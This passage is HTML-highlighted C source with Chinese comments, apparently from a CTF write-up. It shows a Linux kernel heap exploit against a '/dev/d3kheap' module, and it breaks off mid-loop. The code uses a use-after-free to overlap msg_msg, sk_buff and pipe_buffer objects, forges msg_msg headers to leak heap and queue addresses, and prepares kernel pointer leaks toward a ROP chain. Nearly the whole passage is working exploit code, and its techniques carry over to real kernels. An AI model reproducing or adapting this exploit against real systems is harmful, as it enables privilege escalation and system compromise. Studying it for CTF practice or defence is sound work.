+    <span class="token keyword">return</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgtyp<span class="token punctuation">,</span> MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 读取而不释放</span>
+
+<span class="token keyword">int</span> <span class="token function">spraySkBuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> sk_socket<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>sk_socket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 控制大堆块</span>
+
+<span class="token keyword">int</span> <span class="token function">freeSkBuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> sk_socket<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sk_socket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+    msg_msg  <span class="token operator">*</span>nearby_msg <span class="token punctuation">,</span><span class="token operator">*</span>nearby_msg_prim <span class="token punctuation">;</span>
+    pipe_buffer <span class="token operator">*</span>pipe_buf_ptr<span class="token punctuation">;</span>
+    uint64_t victim_addr <span class="token punctuation">;</span>
+    uint64_t <span class="token operator">*</span>rop <span class="token punctuation">;</span>
+    cpu_set_t cpu_set<span class="token punctuation">;</span>
+    pipe_buf_operations <span class="token operator">*</span>ops_ptr<span class="token punctuation">;</span>
+    
+
+    <span class="token keyword">int</span> pipe_fd<span class="token punctuation">[</span>PIPE_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> sk_sockets<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> msqid<span class="token punctuation">[</span>MSG_QUEUE_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">int</span> victim_qid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token comment">// __sock_create</span>
+
+    <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>SOCKET_NUM <span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX <span class="token punctuation">,</span> SOCK_STREAM <span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> sk_sockets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 创建后续利用需要的 sk 结构体</span>
+
+    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/d3kheap"</span> <span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+        msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> <span class="token number">0666</span> <span class="token operator">|</span> IPC_CREAT<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 创建大量 msg_queue 结构体，后面会和 msg_msg 链起来</span>
+
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>primary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
+        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writeMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token operator">&amp;</span>primary_msg <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>primary_msg<span class="token punctuation">)</span> <span class="token punctuation">,</span>PRIMARY_MSG_TYPE <span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"send primary msg error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
+        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writeMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span> <span class="token punctuation">,</span>SECONDARY_MSG_TYPE <span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"send secondary msg error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span>
+            <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"mod_buf_pointer &lt;--> msg_msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// msgsnd 发送大量信息，此时会申请 msg_msg 结构体</span>
+    <span class="token comment">// 其中第二次申请的 msg_msg 大小为 1024 ，很大可能会申请到中间 模块 释放的堆块</span>
+
+    <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 此时让 secondary msg 释放进入 slub-1024</span>
+
+    <span class="token function">buildMsg</span><span class="token punctuation">(</span>
+        <span class="token punctuation">(</span>msg_msg <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>
+        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>
+        SECONDARY_MSG_SIZE <span class="token punctuation">,</span>
+        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 创建 fake msg_msg, 破坏 msg_msg 用于找出 msg_msg</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets <span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"msg_msg &lt;--> sk_buf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 通过 sk 结构体申请大量 1024 的结构体，此时有极大可能申请到刚刚释放出去的堆块</span>
+    <span class="token comment">// 此时某一块 msg_msg 和 sk_buf 为同一个指针</span>
+    <span class="token comment">// 并向其中放置了 fake msg_msg </span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            victim_qid <span class="token operator">=</span> i<span class="token punctuation">;</span>
+            <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">"victim_qid"</span> <span class="token punctuation">,</span> victim_qid<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token comment">// 通过 msgrcv 找出已经被破坏掉的 msg_msg 结构体</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets <span class="token punctuation">,</span> fake_secondary_msg <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 清空 sk_buf </span>
+
+    <span class="token function">buildMsg</span><span class="token punctuation">(</span>
+        <span class="token punctuation">(</span>msg_msg <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>
+        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>
+        VICTIM_MSG_TYPE<span class="token punctuation">,</span>
+        <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>
+        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 修改 fake msg_msg 的 type 并改大 size 从而可以泄露出 堆地址</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets <span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"msg_msg &lt;--> sk_buf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 再次堆喷将 sk 的 object 和 msg_msg 连接</span>
+    <span class="token comment">// 此时再次修改 msg_msg</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token operator">&amp;</span>oob_msg <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to read victim msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_MSG_SIZE<span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to rehit the UAF object!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    nearby_msg <span class="token operator">=</span> <span class="token punctuation">(</span>msg_msg <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_msg<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 找出泄露出的下一个结构体，从而泄露出 msg_queue</span>
+
+    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">"msg_queue_addr"</span> <span class="token punctuation">,</span> nearby_msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span> sk_sockets<span class="token punctuation">,</span>fake_secondary_msg <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">buildMsg</span><span class="token punctuation">(</span>
+        <span class="token punctuation">(</span>msg_msg <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>
+        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>
+        VICTIM_MSG_TYPE<span class="token punctuation">,</span>
+        <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">)</span> <span class="token punctuation">,</span>
+        nearby_msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">,</span>
+        <span class="token number">0</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 将指针指向 msg_queue 从而泄露出当前 msg_msg 的指针</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets <span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 再次堆喷 sk object 修改 msgmsg </span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token operator">&amp;</span>oob_msg <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to read victim msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to rehit the UAF object!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    nearby_msg_prim <span class="token operator">=</span> <span class="token punctuation">(</span>msg_msg <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_msg<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    victim_addr <span class="token operator">=</span> nearby_msg_prim<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">-</span> <span class="token number">0x400</span><span class="token punctuation">;</span>
+
+    <span class="token function">lg</span><span class="token punctuation">(</span><span class="token string">"victim_addr"</span> <span class="token punctuation">,</span>victim_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 读出 msgmsg 的指向泄露出 msgmsg 的地址</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">memset</span><span class="token punctuation">(</span>fake_secondary_msg <span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">buildMsg</span><span class="token punctuation">(</span>
+        <span class="token punctuation">(</span>msg_msg <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>
+        victim_addr <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token punctuation">,</span> victim_addr <span class="token operator">+</span> <span class="token number">0x800</span><span class="token punctuation">,</span>
+        VICTIM_MSG_TYPE<span class="token punctuation">,</span>
+        SECONDARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span> msg_msg<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets <span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 再次伪造 msgmsg 结构体</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> VICTIM_MSG_TYPE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to receive secondary msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 从伪造 msgmsg 结构体读取，此时会释放掉 msgmsg 结构体</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> PIPE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to create pipe!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"deadbeef"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+            <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"failed to write the pipe!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"sk_buf &lt;--> pipe_buf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 堆喷 pipe 结构体，此时 sk_buf 能控制 pipe_buf</span>
+
+    pipe_buf_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>pipe_buffer <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">;</span>
+    <span class="token comment">// 将 buffer 转化为 pipe_buffer 结构体，从而找到内核指针</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
